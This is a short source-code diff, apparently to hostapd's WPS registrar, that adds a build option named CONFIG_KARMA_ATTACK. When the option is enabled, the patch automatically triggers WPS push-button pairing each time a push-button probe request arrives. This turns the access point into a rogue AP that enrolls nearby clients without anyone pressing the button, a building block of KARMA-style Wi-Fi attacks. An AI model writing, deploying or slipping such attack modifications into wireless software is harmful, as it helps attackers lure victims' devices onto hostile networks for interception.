@@ -28,6 +28,13 @@
 
 #ifdef CONFIG_WPS_NFC
 
+#ifdef CONFIG_KARMA_ATTACK
+#include "ap/hostapd.h"
+extern struct hostapd_data *g_hapd_data;
+extern int hostapd_wps_button_pushed(struct hostapd_data *,
+                                     const u8 *);
+#endif
+
 struct wps_nfc_pw_token {
 	struct dl_list list;
 	u8 pubkey_hash[WPS_OOB_PUBKEY_HASH_LEN];
@@ -1172,6 +1179,13 @@ void wps_registrar_probe_req_rx(struct wps_registrar *reg, const u8 *addr,
 		reg->force_pbc_overlap = 1;
 		wps_pbc_overlap_event(reg->wps);
 	}
+/* When receive the PBC probe request, simulate the action
+ * of commad: hostapd_cli wps_pbc */
+#ifdef CONFIG_KARMA_ATTACK
+    if (g_hapd_data->conf->karma_enable &&
+            g_hapd_data->wps_stats.pbc_status != WPS_PBC_STATUS_ACTIVE)
+        hostapd_wps_button_pushed(g_hapd_data, NULL);
+#endif
 }
 
 
